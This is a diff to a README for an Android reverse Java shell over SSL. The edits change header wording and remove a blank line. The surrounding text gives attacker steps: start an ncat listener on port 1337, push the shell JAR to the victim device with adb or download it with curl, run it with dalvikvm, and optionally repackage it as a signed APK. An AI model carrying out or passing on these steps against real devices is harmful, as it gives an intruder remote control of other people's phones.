@@ -1,6 +1,6 @@
 ## Android Reverse Java Shell using SSL Encryption
 
-## On Attacker machine - Linux for example -
+## On Attacker machine - Linux -
 ### (you need android sdk installed and build-tools also) 
 
 #### Compile Java source code to bytecode (if fails for "class error not supported", change the release!)
@@ -15,7 +15,7 @@
 #### Set Listener (USE NCAT!)
 `ncat -nlvp 1337`
 
-## On victim Android device:
+## On Victim device - Android -
 `adb push reverse_ssl.jar /sdcard` (if Android Debug Tools is enabled)
 
 or you can just curl and then run the reverse shell using dalvikvm from Termux:
@@ -25,7 +25,6 @@ or you can just curl and then run the reverse shell using dalvikvm from Termux:
 then
 
 `cd /system/bin/ && ./dalvikvm -cp /sdcard/reverse_ssl.jar Shell`
-
 
 You can of course create a pure .apk package and sign it using Android Studio or apktool and apksigner.
 
